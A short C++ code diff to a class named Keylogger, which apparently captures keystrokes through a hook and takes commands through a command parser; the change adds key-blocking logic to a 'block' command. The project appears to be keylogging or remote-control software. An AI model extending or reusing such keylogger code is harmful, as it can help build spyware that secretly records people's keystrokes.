@@ -31,10 +31,13 @@ Keylogger::Keylogger() {
 		return data;
 	});
 	CommandParser::addCommand(L"block", [this](std::wstring argStr) {
+		auto keys = StringUtilities::splitString(argStr, L" ");
+		for (auto key = keys.begin(); key != keys.end(); key++) {
+			KeyBlockService::getInstance()->addBlockedKey(*key);
+		}
 		return L"Not implemented now";
 	});
 
-	
 	this->isActive = false;
 	hook = make_shared<Hook>();
 }
